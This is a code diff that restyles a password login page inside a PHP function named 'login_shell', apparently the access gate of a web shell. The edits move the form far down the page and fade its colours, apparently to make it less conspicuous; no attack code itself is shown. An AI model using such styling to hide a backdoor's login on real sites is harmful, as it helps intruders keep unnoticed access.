@@ -30,12 +30,13 @@ function login_shell()
             border-radius: 8px;
             color: #fff;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            margin-top: 720px;
         }
 
         .login-container input[type="password"] {
             padding: 10px;
             margin-right: 10px;
-            border: 1px solid #fff;
+            border: 1px solid #4e4e4e69;
             border-radius: 4px;
             background: transparent;
             color: #fff;
@@ -43,31 +44,31 @@ function login_shell()
         }
 
         .login-container input[type="password"]::placeholder {
-            color: #ccc;
+            color: #666666;
         }
 
         .login-container input[type="submit"] {
             padding: 10px 20px;
             border: none;
             border-radius: 4px;
-            background: #28a745;
-            color: #fff;
+            background: #4e4e4e69;
+            color: #000000;
             cursor: pointer;
             outline: none;
         }
 
         .login-container input[type="submit"]:hover {
-            background: #218838;
+            background: #000;
         }
 
         .marquee-container {
             position: fixed;
             bottom: 0;
-            left: 0;
-            width: 100%;
+            left: 500px;
+            right: 500px;
             height: 50px;
             overflow: hidden;
-            background: rgba(0, 0, 0, 0.6);
+            background: rgba(0, 0, 0, 0);
             display: flex;
             align-items: center;
             color: #fff;
@@ -76,8 +77,8 @@ function login_shell()
         .marquee {
             white-space: nowrap;
             display: inline-block;
-            padding-left: 100%;
-            animation: marquee 30s linear infinite;
+            padding-left: 75%;
+            animation: marquee 10s linear infinite;
         }
 
         @keyframes marquee {
@@ -105,6 +106,7 @@ function login_shell()
         </form>
     </div>
 </body>
+</html>
 <?php
     exit;
 }
